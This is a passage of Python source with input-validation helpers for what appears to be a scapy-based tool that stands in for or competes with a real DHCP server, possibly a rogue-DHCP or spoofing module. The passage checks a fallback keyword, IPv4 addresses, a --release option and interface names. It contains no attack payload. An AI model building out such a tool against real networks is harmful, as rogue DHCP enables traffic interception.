        if text.lower() == _DEFAULT_KEYWORD:
            if not fallback:
                raise ModuleError(
                    f"'{_DEFAULT_KEYWORD}' needs a {label} learned from the real "
                    "DHCP server, but none was seen."
                )
            return fallback
        return text

    @staticmethod
    def _validate_ip(value: str, label: str) -> str:
        """Return a canonicalised IPv4 string or raise :class:`ValueError`."""
        try:
            return str(ipaddress.IPv4Address(value.strip()))
        except ValueError as exc:
            raise ValueError(f"Invalid {label} {value!r}: {exc}.") from exc

    @staticmethod
    def _validate_release(value: str | None) -> str | None:
        """Normalise ``--release``, or ``None`` when it was not given."""
        if value is None:
            return None
        text = str(value).strip().lower()
        if text not in _RELEASE_MODES:
            raise ValueError(
                f"Invalid --release {value!r}; expected one of: "
                f"{', '.join(_RELEASE_MODES)}."
            )
        return text

    @staticmethod
    def _validate_iface(interface: str) -> str:
        """Check ``interface`` names a NIC scapy can send on."""
        iface = (interface or "").strip()
        if not iface:
            raise ValueError("Give an interface to work on.")
        scapy_io.refresh_interfaces()
        available = scapy_io.available_interfaces()
        if iface not in available:
            raise ValueError(
                f"Unknown interface {iface!r}. "
                f"Available: {', '.join(available) or 'none'}."
            )
        return iface
